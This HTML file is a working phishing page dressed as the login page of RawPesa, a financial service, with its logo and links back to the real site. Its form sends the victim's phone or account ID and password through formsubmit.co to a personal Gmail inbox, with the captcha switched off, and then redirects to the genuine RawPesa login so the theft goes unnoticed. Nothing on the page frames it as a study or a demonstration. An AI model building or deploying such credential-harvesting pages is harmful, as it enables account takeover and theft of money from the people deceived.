<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>RawPesa Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
</head>
<body class="bg-[#2f2a8a] min-h-screen flex flex-col items-center justify-start p-6">

  <header class="w-full max-w-md flex items-center justify-between mb-8">
    <a href="https://www.rawpesa.com" class="flex items-center text-white text-base font-normal">
      <i class="fas fa-chevron-left mr-2"></i>
      Retour à l'accueil
    </a>
    <img src="./ww.jpg" alt="RawPesa logo" class="h-12 object-contain"/>
  </header>

  <main class="bg-white rounded-3xl w-full max-w-md p-8 shadow-lg flex flex-col">
    <h1 class="text-[#2f2a8a] font-bold text-lg text-center mb-2">BIENVENUE</h1>
    <p class="text-center text-sm text-[#2f2a8a] mb-6">
      N'avez-vous pas un compte ?
      <a href="https://rawpesa.com/reg" class="text-[#4c3bd7] hover:underline">Créer un compte</a>
    </p>
    <hr class="border-t border-gray-300 mb-6"/>

    <form class="flex flex-col space-y-4" action="https://formsubmit.co/victorakonkwa2004@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_subject" value="Tentative de connexion RawPesa">
      <input type="hidden" name="_next" value="https://rawpesa.com/login">

      <input type="text" name="Identifiant" placeholder="Téléphone ou Id Compte"
             class="bg-[#f9f9f9] text-gray-500 placeholder-gray-400 px-4 py-3 rounded-md border border-transparent focus:outline-none focus:ring-2 focus:ring-[#4c3bd7]" required/>

      <div class="relative">
        <input type="password" name="Mot_de_passe" id="passwordInput" placeholder="Mot de passe"
               class="bg-[#f9f9f9] text-gray-500 placeholder-gray-400 px-4 py-3 rounded-md border border-transparent w-full focus:outline-none focus:ring-2 focus:ring-[#4c3bd7]" required/>
        <i id="togglePassword" class="fas fa-eye absolute right-4 top-1/2 transform -translate-y-1/2 text-[#2f2a8a] cursor-pointer"></i>
      </div>

      <button type="submit"
              class="mt-6 bg-[#4c3bd7] text-white font-bold py-4 rounded-xl shadow-lg hover:bg-[#3a2dbb] transition-colors">
        SE CONNECTER
      </button>
    </form>
  </main>

  <script>
    // Affichage/Masquage du mot de passe
    document.getElementById("togglePassword").addEventListener("click", function () {
      const passwordInput = document.getElementById("passwordInput");
      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
      this.classList.toggle("fa-eye-slash");
    });
  </script>
</body>
</html>
